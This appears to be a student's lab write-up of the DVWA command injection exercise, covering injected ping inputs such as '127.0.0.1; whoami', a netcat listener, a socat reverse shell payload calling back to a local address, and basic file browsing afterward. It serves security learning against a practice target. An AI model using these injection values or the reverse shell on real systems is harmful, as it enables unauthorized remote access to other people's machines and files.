# DVWA - Command Injection

## 📌 Overview
In this practice, I tested command injection in an input field that was used to ping a device.

The goal was to check if I can execute system commands through user input.

---

## ⚙️ Basic Command Execution

First, I tested simple commands:

- `127.0.0.1; ls`
- `127.0.0.1; whoami`

### ✅ Result
The application executed both the ping and my extra commands.

This confirmed that input was not properly filtered.

---

## 🔓 Reverse Shell Setup

After basic testing, I tried to get remote access.

### 🖥️ Step 1: Listener Setup
I started a netcat listener on my machine:

`nc -lvnp 1433`

---

### 💉 Step 2: Payload Injection
I generated a reverse shell payload and injected it into the input field.

Payload used:

`socat TCP:10.0.2.15:1433 EXEC:'sh',pty,stderr,setsid,sigint,sane`

---

### 🎯 Result
- Connection received on my machine  
- Remote shell access established  

---

## 🧪 Post Exploitation

After getting access, I tested basic commands:

- `ls` → list files  
- `cd` → move between folders  
- `cat` → read file content  

This showed that I can access system files through the shell.

---

## 🧠 Key Concepts (Simple)

- **Command Injection** → Running system commands through input field  
- **Payload** → Code used to exploit the vulnerability  
- **Netcat** → Tool used to listen and receive connection  
- **Reverse Shell** → Target system connects back and gives access  
- **Socat** → Tool used to create stable shell connection  

---

## 📚 Learning

- Input fields can be dangerous if not validated  
- Simple commands can confirm vulnerability  
- Reverse shell gives deeper system access  
- Attacker can explore system files after access  

---
## 📸 Proof of Work

- Command Injection and Reverse Shell screenshot: [View screenshot](Screenshot-cmd-injection.png)

